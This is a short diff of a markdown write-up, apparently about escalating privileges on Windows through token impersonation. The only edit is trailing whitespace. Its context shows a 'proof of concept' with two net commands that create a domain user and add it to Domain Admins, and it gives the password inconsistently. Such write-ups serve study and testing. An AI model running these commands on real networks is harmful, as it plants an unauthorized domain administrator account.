@@ -51,7 +51,7 @@ This token can then be impersonated to get a shell with higher privilages
 
 
 ### Proof of concept
-for a proof of concept that we have a really high privilage:
+for a proof of concept that we have a really high privilage:  
 	1) `net user /add hawkeye Password!@ /domain`  
 	2) `net group "Domain Admins" hawkeye /ADD /DOMAIN`  
 and this will create a user hawkeye with password as Password1@ and also give it domain admin privilages  
